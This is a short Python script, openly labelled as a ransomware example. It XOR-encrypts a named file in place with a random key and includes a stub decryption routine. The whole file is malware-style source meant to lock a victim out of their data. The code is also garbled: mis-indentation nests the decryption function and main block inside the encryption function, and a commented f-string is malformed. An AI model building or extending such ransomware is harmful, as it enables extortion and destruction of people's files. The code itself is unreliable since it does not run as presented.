# creating malware ransomware example in python 
import os 
import random

def encrypt_file(file_path: str, key: int) -> None:
    """Encrypts a file using a simple XOR cipher."""
    with open(file_path, "rb") as f:
        data = f.read()
        encrypt_file = bytearray(b ^ key for b in data)
    with open(file_path, "wb") as f:
        f.write(encrypt_file)
        def decrypt_file(file_path: str, key: int) -> None:
            """Decrypts a file using a simple XOR cipher."""
            with open(file_path, "rb") as f:
                data = f.read()
                decrypt_file = bytearray(b ^ key for b in data)
            with open(file_path, "wb") as f:
                f.write(decrypt_file)
                if __name__ == "__main__":
                    # Example usage
                    key = random.randint(1,255) # simple key for xor cipher 
                    target_file = "Important Document.txt"
                    print(f"Starting encryption of {target_file} with key {key}")
                    encrypt_file(target_file, key)
                    print(f"File {target_file} encypted.")
                    # To decrypt the file, uncomment the following lines:
                    # print(f"Stating decryption of {target_file) with key {key}}
                    # decrypt_file(target_file, key))
                    